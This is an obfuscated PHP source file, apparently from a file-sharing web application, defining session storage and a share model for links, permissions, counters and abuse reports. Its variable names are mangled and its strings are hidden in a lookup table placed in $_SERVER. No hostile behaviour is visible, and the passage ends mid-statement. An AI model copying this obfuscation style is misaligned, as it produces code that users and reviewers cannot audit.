<?php
 goto b¼°ˆÏ² –; BïÙ–”“™©: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\163\145\x73\x73\151\x6f\x6e"; public function get($©×û¾•å) { $ñêôáĞÃ =& $_SERVER[™»È’øè]; $ñóè›½ú = $this->where(array($ñêôáĞÃ[2005] => $©×û¾•å))->find(); if (!is_array($ñóè›½ú)) { return !1; } return $ñóè›½ú[$ñêôáĞÃ[779]]; } public function set($ÚÅ³ê÷¬, $ııò´Çí, $İ›ªÆğÂ = 3600) { $¦¶íÕê‰ =& $_SERVER[™»È’øè]; $Ö¢ÀÆÎÑ = array($¦¶íÕê‰[2005] => $ÚÅ³ê÷¬, $¦¶íÕê‰[1909] => $ııò´Çí, $¦¶íÕê‰[2006] => $İ›ªÆğÂ + time()); if (Session::get($¦¶íÕê‰[2007])) { $Ö¢ÀÆÎÑ[$¦¶íÕê‰[1678]] = Session::get($¦¶íÕê‰[2007]); } else { $Ö¢ÀÆÎÑ[$¦¶íÕê‰[1678]] = 0; } if ($this->get($ÚÅ³ê÷¬)) { return $this->where(array($¦¶íÕê‰[2005] => $ÚÅ³ê÷¬))->save($Ö¢ÀÆÎÑ); } else { return $this->add($Ö¢ÀÆÎÑ, array(), !0); } } public function remove($¿ˆˆØø») { return $this->where(array($_SERVER[™»È’øè][2005] => $¿ˆˆØø»))->delete(); } public function clearTimeout() { return $this->where($_SERVER[™»È’øè][2008] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\x54\151\155\145", "\x74\151\155\x65", "\x69\156\x73\145\x72\164\x2c\x75\160\x64\141\164\145", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\143\162\x65\141\x74\145\x54\151\x6d\145", "\164\151\155\145", "\x69\x6e\x73\145\162\164", "\146\165\x6e\143\164\x69\157\156"), array("\x6f\160\x74\151\157\156\163", '', "\151\156\163\145\x72\x74\x2c\x75\x70\144\x61\x74\x65\x2c\163\145\x6c\145\x63\164", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¦ª†ë¿) { $ÈÊÚ®àï =& $_SERVER[™»È’øè]; $³»Àå„ = isset($¦ª†ë¿[0]) ? $¦ª†ë¿[0] : !1; return array($ÈÊÚ®àï[2009] => array(USER_ID, $ÈÊÚ®àï[2010]), $ÈÊÚ®àï[1950] => array($³»Àå„, $ÈÊÚ®àï[2011])); } protected function listSimple() { $†áÃŞõó = array($_SERVER[™»È’øè][1678] => USER_ID); $Ö÷Æ¾‘ó = $this->field($this->fieldList)->where($†áÃŞõó)->select(); return $Ö÷Æ¾‘ó ? $Ö÷Æ¾‘ó : array(); } protected function getInfo($Ë½£ÉÊ¶, $››Ôª£ = false) { $Ğñ‹ÚÖ« =& $_SERVER[™»È’øè]; if ($››Ôª£) { return $this->_getShareInfo(array($Ğñ‹ÚÖ«[632] => $Ë½£ÉÊ¶)); } $ó€•“Ö« = $this->cacheFunctionGet($Ğñ‹ÚÖ«[1952], $Ë½£ÉÊ¶); return $ó€•“Ö«; } public function getInfoByHash($²ˆºÉœ) { return $this->_getShareInfo(array($_SERVER[™»È’øè][2012] => $²ˆºÉœ)); } public function getInfoByPath($õš›¾¯Ú) { $ˆŠßÁ§ê =& $_SERVER[™»È’øè]; $¸œÙ“ = array($ˆŠßÁ§ê[1678] => USER_ID, $ˆŠßÁ§ê[180] => $õš›¾¯Ú); return $this->_getShareInfo($¸œÙ“); } public function getInfoBySourcePath($ÚÜ›œÏò) { $ºÃ£ˆÕ÷ =& $_SERVER[™»È’øè]; $ÓÕÕ£å¾ = array($ºÃ£ˆÕ÷[1678] => USER_ID, $ºÃ£ˆÕ÷[1205] => $ÚÜ›œÏò); return $this->_getShareInfo($ÓÕÕ£å¾); } private function _getShareInfo($Í‘•áµ¯) { $±°É­Ÿ» =& $_SERVER[™»È’øè]; $®òçš£½ = $this->where($Í‘•áµ¯)->find(); if (!$®òçš£½) { return !1; } $Í‘•áµ¯ = array($±°É­Ÿ»[632] => $®òçš£½[$±°É­Ÿ»[632]]); $ƒ©âˆáû = $±°É­Ÿ»[2013]; $ªÃ¼ïÙ¶ = Model($±°É­Ÿ»[633])->order($±°É­Ÿ»[442])->field($ƒ©âˆáû)->where($Í‘•áµ¯)->select(); if ($®òçš£½[$±°É­Ÿ»[180]] == $±°É­Ÿ»[211]) { $®òçš£½[$±°É­Ÿ»[87]] = IO::info($®òçš£½[$±°É­Ÿ»[1205]]); } else { $®òçš£½[$±°É­Ÿ»[87]] = Model($±°É­Ÿ»[1362])->pathInfo($®òçš£½[$±°É­Ÿ»[180]]); } $®òçš£½[$±°É­Ÿ»[2014]] = $ªÃ¼ïÙ¶; return $®òçš£½; } protected function getInfoAuth($ˆ–èÑÂ¯) { $À€·¨ø» =& $_SERVER[™»È’øè]; $¾ûá€“ö = $this->getInfo($ˆ–èÑÂ¯); if ($¾ûá€“ö[$À€·¨ø»[1678]] == USER_ID) { $¾ûá€“ö[$À€·¨ø»[454]] = $¾ûá€“ö[$À€·¨ø»[87]][$À€·¨ø»[454]]; } else { $¾ûá€“ö[$À€·¨ø»[454]] = Model($À€·¨ø»[534])->authMake($¾ûá€“ö[$À€·¨ø»[2014]]); } return $¾ûá€“ö; } protected function listData($—û™¡øƒ = null, $éŞŠ¶ÑÙ = 300) { $€áîşõ =& $_SERVER[™»È’øè]; $äï›†ëì = array(array($€áîşõ[529] => array($€áîşõ[1042], 0), $€áîşõ[630] => array($€áîşõ[1042], 0), $€áîşõ[2015] => $€áîşõ[1968])); if ($—û™¡øƒ == $€áîşõ[2016]) { $äï›†ëì = array($€áîşõ[529] => 1); } else { if ($—û™¡øƒ == $€áîşõ[1191]) { $äï›†ëì = array($€áîşõ[630] => 1); } } $äï›†ëì[$€áîşõ[1678]] = USER_ID; $†Å—´èŞ = $this->where($äï›†ëì)->selectPage($éŞŠ¶ÑÙ); return $†Å—´èŞ; } protected function listToMe($çÜış±Å = 300) { $¯Á–ñ‰¾ =& $_SERVER[™»È’øè]; $ÙãìŞó§ = Model($¯Á–ñ‰¾[2017])->userGroupParents(USER_ID); $üĞËº„¢ = array($¯Á–ñ‰¾[615] => SourceModel::TYPE_USER, $¯Á–ñ‰¾[537] => USER_ID); if ($ÙãìŞó§) { $üĞËº„¢ = array(array($¯Á–ñ‰¾[615] => SourceModel::TYPE_USER, $¯Á–ñ‰¾[537] => USER_ID), array($¯Á–ñ‰¾[615] => SourceModel::TYPE_GROUP, $¯Á–ñ‰¾[537] => array($¯Á–ñ‰¾[7], $ÙãìŞó§)), $¯Á–ñ‰¾[2015] => $¯Á–ñ‰¾[1968]); } $í‹ÆÍÃÍ = Model($¯Á–ñ‰¾[633])->where($üĞËº„¢)->selectPage($çÜış±Å); $£µúÒÎ = array_to_keyvalue_group($í‹ÆÍÃÍ[$¯Á–ñ‰¾[412]], $¯Á–ñ‰¾[632]); if (!$£µúÒÎ) { return $í‹ÆÍÃÍ; } $ûıÜãÙÀ = $¯Á–ñ‰¾[2018]; $üĞËº„¢ = array($¯Á–ñ‰¾[632] => array($¯Á–ñ‰¾[459], array_keys($£µúÒÎ)), $¯Á–ñ‰¾[1678] => array($¯Á–ñ‰¾[1044], $¯Á–ñ‰¾[211])); $ûßì‘Ğš = $this->field($ûıÜãÙÀ)->where($üĞËº„¢)->select(); foreach ($ûßì‘Ğš as $›Â×ÂØà => &$Êßéæ¤®) { $Êßéæ¤®[$¯Á–ñ‰¾[2014]] = $£µúÒÎ[$Êßéæ¤®[$¯Á–ñ‰¾[632]]]; } unset($Êßéæ¤®); $ôÑˆÂÃä = array($¯Á–ñ‰¾[2019] => $ûßì‘Ğš, $¯Á–ñ‰¾[2020] => $í‹ÆÍÃÍ[$¯Á–ñ‰¾[409]]); return $ôÑˆÂÃä; } protected function shareAdd($–÷õ§üœ, $©Ã—Ñô„) { $™ÔØùÄß =& $_SERVER[™»È’øè]; $£‹†ÓÔ = $this->_addShareData($–÷õ§üœ, $©Ã—Ñô„); if (!empty($©Ã—Ñô„[$™ÔØùÄß[2021]])) { $this->_shareAuthSet($£‹†ÓÔ, $©Ã—Ñô„[$™ÔØùÄß[2021]]); } $this->shareEventAdd($–÷õ§üœ, $©Ã—Ñô„, $™ÔØùÄß[2022]); return $£‹†ÓÔ; } protected function shareAddSystem($«ŞŞıè, $ŸäƒõÚğ) { $ñ…¿»ó  =& $_SERVER[™»È’øè]; $°âô¯¦ = $this->_addShareData($«ŞŞıè, $ŸäƒõÚğ, $ñ…¿»ó [178]); $this->_shareAuthSet($°âô¯¦, $ŸäƒõÚğ[$ñ…¿»ó [2021]]); return $°âô¯¦; } private function shareEventAdd($úÌª›î×, $›Ä½¿Â, $²ù«û£– = "\x61\x64\x64") { $‰×úÌ›ó =& $_SERVER[™»È’øè]; if (!$úÌª›î× || $úÌª›î× == $‰×úÌ›ó[211]) { return; } if ($²ù«û£– == $‰×úÌ›ó[2022]) { if ($›Ä½¿Â[$‰×úÌ›ó[529]] == $‰×úÌ›ó[88]) { Model($‰×úÌ›ó[600])->eventShare($úÌª›î×, $‰×úÌ›ó[2023]); } if ($›Ä½¿Â[$‰×úÌ›ó[630]] == $‰×úÌ›ó[88]) { Model($‰×úÌ›ó[600])->eventShare($úÌª›î×, $‰×úÌ›ó[2024]); } return; } $‚õº„ËÃ = $this->getInfoByPath($úÌª›î×); $ÄßÖÏ³¨ = $‰×úÌ›ó[2025]; if ($‚õº„ËÃ[$‰×úÌ›ó[529]] == $‰×úÌ›ó[211] && $›Ä½¿Â[$‰×úÌ›ó[529]] == $‰×úÌ›ó[88]) { $ÄßÖÏ³¨ = $‰×úÌ›ó[2023]; } if ($‚õº„ËÃ[$‰×úÌ›ó[529]] == $‰×úÌ›ó[88] && $›Ä½¿Â[$‰×úÌ›ó[529]] == $‰×úÌ›ó[211]) { $ÄßÖÏ³¨ = $‰×úÌ›ó[2026]; } if ($‚õº„ËÃ[$‰×úÌ›ó[630]] == $‰×úÌ›ó[211] && $›Ä½¿Â[$‰×úÌ›ó[630]] == $‰×úÌ›ó[88]) { $ÄßÖÏ³¨ = $‰×úÌ›ó[2024]; } if ($‚õº„ËÃ[$‰×úÌ›ó[630]] == $‰×úÌ›ó[88] && $›Ä½¿Â[$‰×úÌ›ó[630]] == $‰×úÌ›ó[211]) { $ÄßÖÏ³¨ = $‰×úÌ›ó[2027]; } Model($‰×úÌ›ó[600])->eventShare($úÌª›î×, $ÄßÖÏ³¨); return; } private function _addShareData($Æë˜°Ñë, $Ø°¦ååõ = array(), $÷¬ÚÔ·™ = false) { $Ùâ¸¾–¯ =& $_SERVER[™»È’øè]; $úåğóäƒ = $÷¬ÚÔ·™ == $Ùâ¸¾–¯[178] ? 0 : USER_ID; $±Á÷ÖÓ = array($Ùâ¸¾–¯[458] => $Æë˜°Ñë, $Ùâ¸¾–¯[1669] => $úåğóäƒ); if ($Æë˜°Ñë == 0) { $±Á÷ÖÓ = array($Ùâ¸¾–¯[2028] => $Ø°¦ååõ[$Ùâ¸¾–¯[1205]], $Ùâ¸¾–¯[1669] => $úåğóäƒ); } if ($óÙ·ØİŠ = $this->where($±Á÷ÖÓ)->find()) { return $óÙ·ØİŠ[$Ùâ¸¾–¯[632]]; } if ($Æë˜°Ñë == 0) { $•Øœ¶È = array($Ùâ¸¾–¯[32] => get_path_this($Ø°¦ååõ[$Ùâ¸¾–¯[84]])); } else { $•Øœ¶È = Model($Ùâ¸¾–¯[850])->sourceInfo($Æë˜°Ñë); if (!$•Øœ¶È) { return !1; } } if (!$Ø°¦ååõ[$Ùâ¸¾–¯[1573]]) { $Ø°¦ååõ[$Ùâ¸¾–¯[1573]] = $•Øœ¶È[$Ùâ¸¾–¯[32]]; } $‘º˜”¾— = array($Ùâ¸¾–¯[1669] => $úåğóäƒ, $Ùâ¸¾–¯[458] => $Æë˜°Ñë, $Ùâ¸¾–¯[1573] => $Ùâ¸¾–¯[12], $Ùâ¸¾–¯[529] => 0, $Ùâ¸¾–¯[630] => 0, $Ùâ¸¾–¯[1205] => $Ùâ¸¾–¯[12], $Ùâ¸¾–¯[350] => $Ùâ¸¾–¯[12], $Ùâ¸¾–¯[919] => $Ùâ¸¾–¯[12], $Ùâ¸¾–¯[2029] => 0, $Ùâ¸¾–¯[2030] => 0, $Ùâ¸¾–¯[786] => 0, $Ùâ¸¾–¯[2031] => $Ùâ¸¾–¯[12], $Ùâ¸¾–¯[2012] => $Ùâ¸¾–¯[12]); $ˆ®ıÂ®Ø = explode($Ùâ¸¾–¯[50], $Ùâ¸¾–¯[2032]); foreach ($ˆ®ıÂ®Ø as $şàî¥™‘) { if (!isset($Ø°¦ååõ[$şàî¥™‘])) { continue; } $‘º˜”¾—[$şàî¥™‘] = $Ø°¦ååõ[$şàî¥™‘]; } $áêš‡† = $this->add($‘º˜”¾—); $äê‚ï¸‚ = array($Ùâ¸¾–¯[2012] => short_id($áêš‡†)); $this->where(array($Ùâ¸¾–¯[2033] => $áêš‡†))->save($äê‚ï¸‚); return $áêš‡†; } private function _shareAuthSet($Ä¿Ø®±›, $«ÇåÚùï) { $¾ãœ¡Ï =& $_SERVER[™»È’øè]; if (!is_array($«ÇåÚùï)) { return !1; } $Á¢Ş·•ã = Model($¾ãœ¡Ï[1978]); $Á¢Ş·•ã->where(array($¾ãœ¡Ï[632] => $Ä¿Ø®±›))->delete(); $ü½Œ³í = array(); foreach ($«ÇåÚùï as $Âİ£ÅÂé) { $š“¬›Õ = SourceModel::TYPE_USER; if ($Âİ£ÅÂé[$¾ãœ¡Ï[177]] == SourceModel::TYPE_GROUP) { $š“¬›Õ = SourceModel::TYPE_GROUP; } $¬ùŸüöõ = array($¾ãœ¡Ï[632] => $Ä¿Ø®±›, $¾ãœ¡Ï[177] => $š“¬›Õ, $¾ãœ¡Ï[537] => intval($Âİ£ÅÂé[$¾ãœ¡Ï[537]]), $¾ãœ¡Ï[1974] => 0, $¾ãœ¡Ï[2034] => -1); if ($Âİ£ÅÂé[$¾ãœ¡Ï[1974]]) { $¬ùŸüöõ[$¾ãœ¡Ï[1974]] = $Âİ£ÅÂé[$¾ãœ¡Ï[1974]]; } else { if ($Âİ£ÅÂé[$¾ãœ¡Ï[2034]]) { $¬ùŸüöõ[$¾ãœ¡Ï[2034]] = $Âİ£ÅÂé[$¾ãœ¡Ï[2034]]; } } $ü½Œ³í[] = $¬ùŸüöõ; } return $Á¢Ş·•ã->addAll($ü½Œ³í, array(), !0); } public function numViewAdd($àÛûú²€) { $Ê‹µÈ¥ =& $_SERVER[™»È’øè]; $ß—§ŞŸÙ = array($Ê‹µÈ¥[2033] => $àÛûú²€); $this->where($ß—§ŞŸÙ)->setAdd($Ê‹µÈ¥[2029]); } public function numDownloadAdd($‡òÙÑŠô) { $ôÙ´ç…À =& $_SERVER[™»È’øè]; $â¨’áÒÓ = array($ôÙ´ç…À[2033] => $‡òÙÑŠô); $this->where($â¨’áÒÓ)->setAdd($ôÙ´ç…À[2030]); } protected function shareEdit($¥Ñ¨¿£ë, $ÀÀİ…Ç·) { $ßêÃãÖª =& $_SERVER[™»È’øè]; $æ®ÍÒ¹ = $this->getInfo($¥Ñ¨¿£ë); if (!$æ®ÍÒ¹) { return !1; } $this->_checkLinkShare($ÀÀİ…Ç·, $æ®ÍÒ¹); $—†ØÜ–µ = array(); $×ÁÙ¬× = explode($ßêÃãÖª[50], $ßêÃãÖª[2035]); foreach ($×ÁÙ¬× as $îŸ…Û„Ñ) { if (!array_key_exists($îŸ…Û„Ñ, $ÀÀİ…Ç·)) { continue; } $—†ØÜ–µ[$îŸ…Û„Ñ] = $ÀÀİ…Ç·[$îŸ…Û„Ñ]; } $this->shareEventAdd($æ®ÍÒ¹[$ßêÃãÖª[180]], $ÀÀİ…Ç·, $ßêÃãÖª[1840]); $this->where(array($ßêÃãÖª[2033] => $¥Ñ¨¿£ë))->save($—†ØÜ–µ); if (isset($ÀÀİ…Ç·[$ßêÃãÖª[2021]])) { $this->_shareAuthSet($¥Ñ¨¿£ë, $ÀÀİ…Ç·[$ßêÃãÖª[2021]]); } return !0; } private function _checkLinkShare($±›¢¡ëõ, $¥‰ßşÒ•) { $õÎÔÆ¥ =& $_SERVER[™»È’øè]; if ($±›¢¡ëõ[$õÎÔÆ¥[529]] != $õÎÔÆ¥[88]) { return; } $ºÎÔû¿± = $¥‰ßşÒ•[$õÎÔÆ¥[87]][$õÎÔÆ¥[180]]; if ($¥‰ßşÒ•[$õÎÔÆ¥[87]][$õÎÔÆ¥[33]] != $õÎÔÆ¥[213]) { $Éö­èè“ = $this->_folderReport($ºÎÔû¿±); if (!$Éö­èè“) { return; } show_json(LNG($õÎÔÆ¥[2036]) . $õÎÔÆ¥[2037] . $Éö­èè“, !1); } $çÂ·¦ê = Model($õÎÔÆ¥[850])->fileInfoGet($¥‰ßşÒ•[$õÎÔÆ¥[87]][$õÎÔÆ¥[180]]); if (!$çÂ·¦ê) { return; } $ÉŞáÖ¹€ = $this->shareFileMeta($çÂ·¦ê[$õÎÔÆ¥[508]]); if (isset($ÉŞáÖ¹€[$õÎÔÆ¥[417]]) && $ÉŞáÖ¹€[$õÎÔÆ¥[417]] == $õÎÔÆ¥[88]) { show_json(LNG($õÎÔÆ¥[2038]), !1); } } private function _folderReport($à¨–øÉì) { $¤âÀÌŸ =& $_SERVER[™»È’øè]; $äÔÇšç = array($¤âÀÌŸ[508] => array($¤âÀÌŸ[1042], 0), $¤âÀÌŸ[775] => 3); $õº—à‹Ÿ = Model($¤âÀÌŸ[2039])->where($äÔÇšç)->field($¤âÀÌŸ[508])->select(); if (!$õº—à‹Ÿ) { return !1; } $õº—à‹Ÿ = array_to_keyvalue($õº—à‹Ÿ, $¤âÀÌŸ[12], $¤âÀÌŸ[508]); $´½¦ıˆ = $¤âÀÌŸ[50] . $à¨–øÉì . $¤âÀÌŸ[50]; $äÔÇšç = array($¤âÀÌŸ[508] => array($¤âÀÌŸ[7], $õº—à‹Ÿ), $¤âÀÌŸ[552] => array($¤âÀÌŸ[426], "\x25{$´½¦ıˆ}\45"), $¤âÀÌŸ[472] => 0); $‰á“§’ = Model($¤âÀÌŸ[850])->where($äÔÇšç)->field($¤âÀÌŸ[2040])->find(); if (!$‰á“§’) { return !1; } $üÆÛÛ»Œ = substr($‰á“§’[$¤âÀÌŸ[552]], strpos($‰á“§’[$¤âÀÌŸ[552]], $´½¦ıˆ)); $äÔÇšç = array($¤âÀÌŸ[180] => array($¤âÀÌŸ[7], trim($üÆÛÛ»Œ, $¤âÀÌŸ[50]))); $³‡ë…û• = Model($¤âÀÌŸ[850])->where($äÔÇšç)->field($¤âÀÌŸ[32])->select(); $ÇšÛáûÑ = array_to_keyvalue($³‡ë…û•, $¤âÀÌŸ[12], $¤âÀÌŸ[32]); $ÇšÛáûÑ[] = $‰á“§’[$¤âÀÌŸ[32]]; return implode($¤âÀÌŸ[8], $ÇšÛáûÑ); } protected function remove($˜¨†Êà) { $ÚÚ§•½ =& $_SERVER[™»È’øè]; if (is_array($˜¨†Êà)) { $˜¨†Êà = array($ÚÚ§•½[7], $˜¨†Êà); } $Æ“€Î¨ = array($ÚÚ§•½[632] => $˜¨†Êà); $¨ı­¥¦› = $this->where($Æ“€Î¨)->delete(); if ($¨ı­¥¦›) { Model($ÚÚ§•½[633])->where(array($ÚÚ§•½[632] => $˜¨†Êà))->delete(); } $ÊĞ”ÄÚ® = is_array($˜¨†Êà) ? $˜¨†Êà[1] : array($˜¨†Êà); for ($Ø„·İ · = 0; $Ø„·İ · < count($ÊĞ”ÄÚ®); $Ø„·İ ·++) { $šĞÏŒí = $this->getInfo($ÊĞ”ÄÚ®[$Ø„·İ ·]); if ($šĞÏŒí[$ÚÚ§•½[630]] == $ÚÚ§•½[88]) { Model($ÚÚ§•½[600])->eventShare($šĞÏŒí[$ÚÚ§•½[180]], $ÚÚ§•½[2027]); } if ($šĞÏŒí[$ÚÚ§•½[529]] == $ÚÚ§•½[88]) { Model($ÚÚ§•½[600])->eventShare($šĞÏŒí[$ÚÚ§•½[180]], $ÚÚ§•½[2026]); } } return $¨ı­¥¦›; } protected function removeBySource($ÆêÚçìÌ) { $™¥‹ëÌ =& $_SERVER[™»È’øè]; $Ş•òü‰ = array($™¥‹ëÌ[458] => array($™¥‹ëÌ[459], $ÆêÚçìÌ)); $ŠÖ˜è¤Ì = $this->field($™¥‹ëÌ[632])->where($Ş•òü‰)->select(); $ŠÖ˜è¤Ì = array_to_keyvalue($ŠÖ˜è¤Ì, $™¥‹ëÌ[12], $™¥‹ëÌ[632]); if (!$ŠÖ˜è¤Ì) { return; } $Ş•òü‰ = array($™¥‹ëÌ[2033] => array($™¥‹ëÌ[459], $ŠÖ˜è¤Ì)); $this->where($Ş•òü‰)->delete(); Model($™¥‹ëÌ[633])->where($Ş•òü‰)->delete(); } public function listAll($ßéÇÀ‚Â) { $Úâ›õï‘ =& $_SERVER[™»È’øè]; $¾ÓŸî©¥ = array(); if ($ßéÇÀ‚Â[$Úâ›õï‘[1678]]) { $¾ÓŸî©¥[$Úâ›õï‘[1678]] = $ßéÇÀ‚Â[$Úâ›õï‘[1678]]; } if ($ßéÇÀ‚Â[$Úâ›õï‘[785]]) { $¾§Ÿ”ú = $ßéÇÀ‚Â[$Úâ›õï‘[786]] ? $ßéÇÀ‚Â[$Úâ›õï‘[786]] : strtotime(date($Úâ›õï‘[2041])); $¾ÓŸî©¥[$Úâ›õï‘[214]] = array($Úâ›õï‘[376], array($ßéÇÀ‚Â[$Úâ›õï‘[785]], $¾§Ÿ”ú)); } if ($ßéÇÀ‚Â[$Úâ›õï‘[33]]) { $¾ÓŸî©¥[$ßéÇÀ‚Â[$Úâ›õï‘[33]]] = 1; } else { $¾ÓŸî©¥[] = array($Úâ›õï‘[529] => array($Úâ›õï‘[1042], 0), $Úâ›õï‘[630] => array($Úâ›õï‘[1042], 0), $Úâ›õï‘[2015] => $Úâ›õï‘[1968]); } if ($ßéÇÀ‚Â[$Úâ›õï‘[1964]]) { $¾ÓŸî©¥[] = array($Úâ›õï‘[2012] => $ßéÇÀ‚Â[$Úâ›õï‘[1964]], $Úâ›õï‘[1573] => array($Úâ›õï‘[426], "\45{$ßéÇÀ‚Â[$Úâ›õï‘[1964]]}\45"), $Úâ›õï‘[2015] => $Úâ›õï‘[1968]); } $Êí™µÖÒ = $this->_makeOrder()->where($¾ÓŸî©¥)->selectPage(20); if (empty($Êí™µÖÒ[$Úâ›õï‘[412]])) { return array(); } $this->_listDataApply($Êí™µÖÒ[$Úâ›õï‘[412]]); return $Êí™µÖÒ; } public function listDataApply($Ÿ¿Ø»äô) { $this->_listDataApply($Ÿ¿Ø»äô); return $Ÿ¿Ø»äô; } private function _listDataApply(&$à±Í‹Õã) { $Æí»Ş€ =& $_SERVER[™»È’øè]; $ñ™„„™” = array_to_keyvalue($à±Í‹Õã, $Æí»Ş€[12], $Æí»Ş€[1678]); $¯Áˆæ¹‘ = Model($Æí»Ş€[566])->userListInfo(array_unique($ñ™„„™”)); $Èî˜Öæ€ = array_to_keyvalue($à±Í‹Õã, $Æí»Ş€[12], $Æí»Ş€[180]); $òÊ¬ ÉÇ = Model($Æí»Ş€[850])->sourceListInfo($Èî˜Öæ€, !0); foreach ($à±Í‹Õã as $šÒìğ¬« => &$¶—ö¨²Â) { $Ë÷Æ‚Ÿ = $¶—ö¨²Â[$Æí»Ş€[1678]]; $¶—ö¨²Â[$Æí»Ş€[2042]] = $¯Áˆæ¹‘[$Ë÷Æ‚Ÿ] ? $¯Áˆæ¹‘[$Ë÷Æ‚Ÿ] : !1; $ùÊü¡î± = $¶—ö¨²Â[$Æí»Ş€[180]]; $¶—ö¨²Â[$Æí»Ş€[87]] = $òÊ¬ ÉÇ[$ùÊü¡î±] ? $òÊ¬ ÉÇ[$ùÊü¡î±] : !1; if ($¶—ö¨²Â[$Æí»Ş€[87]][$Æí»Ş€[472]] == $Æí»Ş€[88]) { unset($à±Í‹Õã[$šÒìğ¬«]); } if ($¶—ö¨²Â[$Æí»Ş€[87]] != $Æí»Ş€[211] && !$¶—ö¨²Â[$Æí»Ş€[87]]) { unset($à±Í‹Õã[$šÒìğ¬«]); } } unset($¶—ö¨²Â); $à±Í‹Õã = array_values($à±Í‹Õã); } private function _makeOrder($ÎÅëˆºé = '') { $ğÕ»âÇ =& $_SERVER[™»È’øè]; $Ï¦›ÊÉ = array($ğÕ»âÇ[214], $ğÕ»âÇ[786], $ğÕ»âÇ[2029], $ğÕ»âÇ[2030]); $ô¦®ı¾› = array($ğÕ»âÇ[490] => $ğÕ»âÇ[491], $ğÕ»âÇ[492] => $ğÕ»âÇ[493]); $ÈÓÉ¦ƒ˜ = Input::get($ğÕ»âÇ[497], $ğÕ»âÇ[7], $ğÕ»âÇ[464], $Ï¦›ÊÉ); $¡Î™ËÂ¢ = Input::get($ğÕ»âÇ[498], $ğÕ»âÇ[7], $ğÕ»âÇ[2043], array($ğÕ»âÇ[1961], $ğÕ»âÇ[492])); $¡Î™ËÂ¢ = $ô¦®ı¾›[$¡Î™ËÂ¢]; $ÎÅëˆºé = $ÎÅëˆºé . "{$ÈÓÉ¦ƒ˜}\40{$¡Î™ËÂ¢}"; return $this->order($ÎÅëˆºé); } public function reportAdd($½’ãì’Ù) { $½š¶ï«Ç =& $_SERVER[™»È’øè]; $ôŒ…›Òá = array($½š¶ï«Ç[632] => $½’ãì’Ù[$½š¶ï«Ç[632]], $½š¶ï«Ç[1678] => USER_ID); if (Model($½š¶ï«Ç[2039])->where($ôŒ…›Òá)->find()) { return !1; } $ıÈ¢È°© = array($½š¶ï«Ç[632] => $½’ãì’Ù[$½š¶ï«Ç[632]], $½š¶ï«Ç[1573] => $½’ãì’Ù[$½š¶ï«Ç[1573]], $½š¶ï«Ç[180] => $½’ãì’Ù[$½š¶ï«Ç[180]], $½š¶ï«Ç[508] => $½’ãì’Ù[$½š¶ï«Ç[508]], $½š¶ï«Ç[1678] => USER_ID, $½š¶ï«Ç[33] => $½’ãì’Ù[$½š¶ï«Ç[33]], $½š¶ï«Ç[493] => $½’ãì’Ù[$½š¶ï«Ç[493]]); return Model($½š¶ï«Ç[2039])->add($ıÈ¢È°©); } public function reportList($éÑ³«µÁ) { $óÊ„¥İ =& $_SERVER[™»È’øè]; $‹‰ÎáØ = array(); if ($éÑ³«µÁ[$óÊ„¥İ[785]]) { $ç¼İó„ç = $éÑ³«µÁ[$óÊ„¥İ[786]] ? $éÑ³«µÁ[$óÊ„¥İ[786]] : strtotime(date($óÊ„¥İ[2041])); $‹‰ÎáØ[$óÊ„¥İ[214]] = array($óÊ„¥İ[376], array($éÑ³«µÁ[$óÊ„¥İ[785]], $ç¼İó„ç)); } if (isset($éÑ³«µÁ[$óÊ„¥İ[33]]) && in_array($éÑ³«µÁ[$óÊ„¥İ[33]], array($óÊ„¥İ[88], $óÊ„¥İ[477], $óÊ„¥İ[2044], $óÊ„¥İ[2045], $óÊ„¥İ[2046]))) { $‹‰ÎáØ[$óÊ„¥İ[33]] = $éÑ³«µÁ[$óÊ„¥İ[33]]; } if (isset($éÑ³«µÁ[$óÊ„¥İ[775]]) && in_array($éÑ³«µÁ[$óÊ„¥İ[775]], array($óÊ„¥İ[211], $óÊ„¥İ[88], $óÊ„¥İ[477], $óÊ„¥İ[2044]))) { $‹‰ÎáØ[$óÊ„¥İ[775]] = $éÑ³«µÁ[$óÊ„¥İ[775]]; } $˜‰Ğá®Ä = Input::get($óÊ„¥İ[498], $óÊ„¥İ[7], $óÊ„¥İ[2043], array($óÊ„¥İ[1961], $óÊ„¥İ[492])); $å©ÖïöØ = array($óÊ„¥İ[490] => $óÊ„¥İ[491], $óÊ„¥İ[492] => $óÊ„¥İ[493]); $Ü˜¿Ùã = $óÊ„¥İ[2047] . $å©ÖïöØ[$˜‰Ğá®Ä]; $Î…ûÈò = Model($óÊ„¥İ[2039])->where($‹‰ÎáØ)->order($Ü˜¿Ùã)->selectPage(20); if (empty($Î…ûÈò[$óÊ„¥İ[412]])) { return array(); } $–›óãæã = array_to_keyvalue_group($Î…ûÈò[$óÊ„¥İ[412]], $óÊ„¥İ[775], $óÊ„¥İ[632]); if (!empty($–›óãæã[0])) { $éÑ³«µÁ = $–›óãæã[0]; $‹‰ÎáØ = array($óÊ„¥İ[632] => array($óÊ„¥İ[7], $éÑ³«µÁ)); $Úôéä‘ = $this->where($‹‰ÎáØ)->field($óÊ„¥İ[632])->select(); $Úôéä‘ = array_to_keyvalue($Úôéä‘, $óÊ„¥İ[12], $óÊ„¥İ[632]); $´²–ì³ı = array_diff($éÑ³«µÁ, $Úôéä‘); if (!empty($´²–ì³ı)) { foreach ($Î…ûÈò[$óÊ„¥İ[412]] as $¹õÏßõ => $°ğ‡¶Ú) { if (in_array($°ğ‡¶Ú[$óÊ„¥İ[632]], $´²–ì³ı)) { unset($Î…ûÈò[$óÊ„¥İ[412]][$¹õÏßõ]); } } } } $this->_listDataApply($Î…ûÈò[$óÊ„¥İ[412]]); return $Î…ûÈò; } public function reportStatus($ÚŒœØœè) { $››ÛÒÑ =& $_SERVER[™»È’øè]; $Àô§¾Ü­ = array($››ÛÒÑ[442] => $ÚŒœØœè[$››ÛÒÑ[442]]); $³¿í„ä§ = Model($››ÛÒÑ[2039])->where($Àô§¾Ü­)->field($››ÛÒÑ[2048])->find(); if (!$³¿í„ä§) { return !1; } $ã´Ğ¶ğå = array($››ÛÒÑ[775] => $ÚŒœØœè[$››ÛÒÑ[775]]); if ($ÚŒœØœè[$››ÛÒÑ[775]] == $››ÛÒÑ[2044] && $³¿í„ä§[$››ÛÒÑ[775]] == 